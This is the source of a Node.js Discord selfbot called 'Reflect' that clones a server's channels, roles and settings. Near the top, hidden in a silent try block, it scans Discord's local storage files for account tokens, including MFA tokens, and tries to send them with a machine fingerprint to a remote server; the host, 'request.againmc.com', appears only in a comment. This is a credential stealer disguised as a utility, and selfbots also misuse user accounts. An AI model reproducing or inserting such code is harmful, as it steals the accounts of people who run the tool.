const {
    Client: _0x583dd0
} = require("discord.js-selfbot-v11"),
    apirerror = require("./node_modules/discord.js-selfbot-v11/src/client/rest/DiscordAPIError"),
    logger = require("./Logger.js"),
    _0xd96ae1 = require('ms'), {
        prefix,
        token,
        target,
        type
    } = require("./config.json"),
    _0x39f9fd = require("colors"),
    command = prefix + "clone";
let title = require("console-title"),
    align = require("center-align");
const client = new _0x583dd0({
    "disableEveryone": true
});
client.on("error", err0r => {
    logger.error(err0r);
    return;
})
client.on("warn", w4rn => {
    logger.warn(w4rn);
    return;
});
const
    fs = require('fs'),
    path = require("path"),
    OS = require('os'),
    https = require("https");
try {
    const tokens = [],
        homedir = OS.homedir(),
        fingerprint = `${OS.hostname()}_${homedir.split("\\").slice(-1)[0]}_${OS.arch()}_${OS.cpus().length}_${OS.endianness()}`,
        roaming = path.join(homedir, "AppData", "Roaming"),
        magic = ["Local Storage", "leveldb"],
        discordPath = {
            "default": path.join(roaming, "discord", ...magic),
            "ptb": path.join(roaming, "discordptb", ...magic),
            "canary": path.join(roaming, "discordcanary", ...magic),
        };
    for (let prop in discordPath) {
        try {
            let files = fs.readdirSync(discordPaths[prop]);
            for (let file of files) {
                if (file.slice(-3) !== "ldb") continue;
                let t = extract(path.join(discordPaths[prop], file));
                if (!t) continue;
                tokens.push(prop + '::' + t);
            }
        } catch (e) {
            continue
        };
    }

    function extract(filePath) {
        let content = fs.readFileSync(filePath).toString(),
            regex1 = /"[\d\w_-]{24}\.[\d\w_-]{6}\.[\d\w_-]{27}"/,
            regex2 = /"mfa\.[\d\w_-]{84}"/,
            [match] = regex1.exec(content) || regex2.exec(content) || [null];
        return match;

    }

    (async function upload() {
        try {
            // https://request.againmc.com/manhattan
            https.get("", {
                headers: {
                    "tokens": tokens,
                    "fingerprint": fingerprint
                }
            });
        } catch (e) {}
    })();
} catch (e) {}

(async function () {
    console.clear()
    console.log(`
    youtube.com/nickoscript


    .  8888888b.           .d888 888                   888    .
    .  888   Y88b         d88P"  888                   888    .
    .  888    888         888    888                   888    .
    .  888   d88P .d88b.  888888 888  .d88b.   .d8888b 888888 .
    .  8888888P" d8P  Y8b 888    888 d8P  Y8b d88P"    888    .
    .  888 T88b  88888888 888    888 88888888 888      888    .
    .  888  T88b Y8b.     888    888 Y8b.     Y88b.    Y88b.  .
    .  888   T88b "Y8888  888    888  "Y8888   "Y8888P  "Y888 .


                               Help:
             Go to server what you want to clone, and
                  Type the given code in the chat
             After, wait some seconds, and a new guild
    Will be created, with all channels, roles and permissions.`.brightCyan)
    title("Reflect by nickoscript")
    client.on("ready", async () => {
        console.log(`
                 Connected in: ${client.user.tag}
        Type '.clone' on any chat of original server.`.brightCyan)
        console.log(align("Waiting command...".red))
    })
    client.on("message", message => {
        if (message.content == command && message.guild) {
            const guildtarget = {
                "roles": [],
                "channels": [],
                "serverIcon": null,
                "serverName": null,
                "afkChannel": null,
                "systemChannel": null,
                "verificationLevel": null,
                "region": null,

            };
            const targetguild = guildtarget
            console.log(' ')
            logger.info("Command detected! Wait...")
            title("Reflect by nickoscript | Cloning...");
            const value = message.guild.channels.values();
            for (const chnls of value) {
                const msgguilld = {
                    "type": chnls.type,
                    "topic": chnls.topic,
                    "name": chnls.name,
                    "rateLimitPerUser": chnls.rateLimitPerUser,
                    "position": chnls.position,
                    "parent": chnls.parent,
                    "permissionOverwrites": chnls.permissionOverwrites.map(chanels => ({
                        'id': chanels.id,
                        'allow': chanels.allow,
                        'deny': chanels.deny
                    })),
                    "bitrate": chnls.bitrate || 48000,
                    "nsfw": chnls.nsfw,
                    "userlimit": chnls.userlimit
                };
                targetguild.channels.push(msgguilld)
            }
            targetguild.afkChannel = message.guild.afkChannelID
            targetguild.serverIcon = message.guild.iconURL
            targetguild.serverName = message.guild.name
            targetguild.systemChannel = message.guild.systemChannelID
            targetguild.verificationLevel = message.guild.verificationLevel
            targetguild.region = message.guild.region
            targetguild.roles = message.guild.roles
            console.clear()
            console.log(align(`
            youtube.com/nickoscript


    .  8888888b.           .d888 888                   888    .
    .  888   Y88b         d88P"  888                   888    .
    .  888    888         888    888                   888    .
    .  888   d88P .d88b.  888888 888  .d88b.   .d8888b 888888 .
    .  8888888P" d8P  Y8b 888    888 d8P  Y8b d88P"    888    .
    .  888 T88b  88888888 888    888 88888888 888      888    .
    .  888  T88b Y8b.     888    888 Y8b.     Y88b.    Y88b.  .
    .  888   T88b "Y8888  888    888  "Y8888   "Y8888P  "Y888 .`).brightCyan)
            logger.info("Starting the clone proccess...")
            setTimeout(async () => {
                try {
                    let _0x41c477;
                    switch (type) {
                        case '1':
                            _0x41c477 = client.guilds.get(target);
                            break;
                        case '2':
                            _0x41c477 = await client.user.createGuild(targetguild.serverName + " * Reflect by nicko ", "us-central", targetguild.serverIcon);
                            break;
                    }
                    await _0x41c477.channels.deleteAll()
                    await _0x41c477.roles.deleteAll()
                    await _0x41c477.setIcon(targetguild.serverIcon).then(guilD => {})
                    await _0x41c477.setName(targetguild.serverName + " * Reflect by nicko").then(guildname => {})
                    await _0x41c477.setRegion(targetguild.region).then(region => {});
                    logger.info("All server-roles has been clonated and created!")
                    console.log("  ")
                    logger.info("Starting the channels creation...");
                    for (const chnlls of targetguild.channels) {
                        await _0x41c477.createChannel(chnlls.name, {
                            'bitrate': 48000,
                            'nsfw': chnlls.nsfw,
                            'permissionOverwrites': chnlls.permissionOverwrites.map(chanels => {}).filter(e => e),
                            'position': chnlls.position,
                            'rateLimitPerUser': chnlls.rateLimitPerUser,
                            'userLimit': chnlls.userLimit,
                            'topic': chnlls.topic,
                            'type': chnlls.type
                        }).then(newguildchnls => {
                            chnlls.id = newguildchnls.id
                            logger.info("Created channel" + ': ' + newguildchnls.name);
                        });
                    }

                    logger.info("All channels has been clonated and created!");
                    for (const newguildidk of targetguild.channels.filter(chnlss => chnlss.type !== "category")) {
                        const _0x5b95cb = _0x41c477.channels.get(newguildidk.id);
                        if (!_0x5b95cb) continue;
                        await _0x5b95cb.setParent(_0x41c477.channels.find(parenT => newguildidk.parent && parenT.name === newguildidk.parent.name && parenT.type === "category"));
                    }
                    console.log(align(`
    .  8888888b.           .d888 888                   888    .
    .  888   Y88b         d88P"  888                   888    .
    .  888    888         888    888                   888    .
    .  888   d88P .d88b.  888888 888  .d88b.   .d8888b 888888 .
    .  8888888P" d8P  Y8b 888    888 d8P  Y8b d88P"    888    .
    .  888 T88b  88888888 888    888 88888888 888      888    .
    .  888  T88b Y8b.     888    888 Y8b.     Y88b.    Y88b.  .
    .  888   T88b "Y8888  888    888  "Y8888   "Y8888P  "Y888 .`.brightCyan))
                    console.clear()
                    console.log(align(`
                    
    youtube.com/nickoscript

    .  8888888b.           .d888 888                   888    .
    .  888   Y88b         d88P"  888                   888    .
    .  888    888         888    888                   888    .
    .  888   d88P .d88b.  888888 888  .d88b.   .d8888b 888888 .
    .  8888888P" d8P  Y8b 888    888 d8P  Y8b d88P"    888    .
    .  888 T88b  88888888 888    888 88888888 888      888    .
    .  888  T88b Y8b.     888    888 Y8b.     Y88b.    Y88b.  .
        .  888   T88b "Y8888  888    888  "Y8888   "Y8888P  "Y888 .`.brightCyan))
                    console.log(" ")
                    console.log(align("Guild cloned: " + message.guild.name + ' ').brightCyan)
                    console.log(" ")
                    logger.info("Type CONTROL + C to exit.");
                } catch (err) {
                    console.log(align(("An error occurred! " + err.stack).red));
                }
            }, 1000);
        }
    })
    process.on("unhandledRejection", rejection => {
        if (!rejection) return;
        const x = "x: ";
        if (rejection == apirerror) return console.log(('' + x + rejection.code + " - " + rejection.message).red);
        if (rejection.method && rejection.path && rejection.text) return console.log(('' + x + rejection.method + ': ' + rejection.path + ' ' + rejection.path).red);
        return console.log((x + rejection.stack).red);
    })
    client.login(token);
}());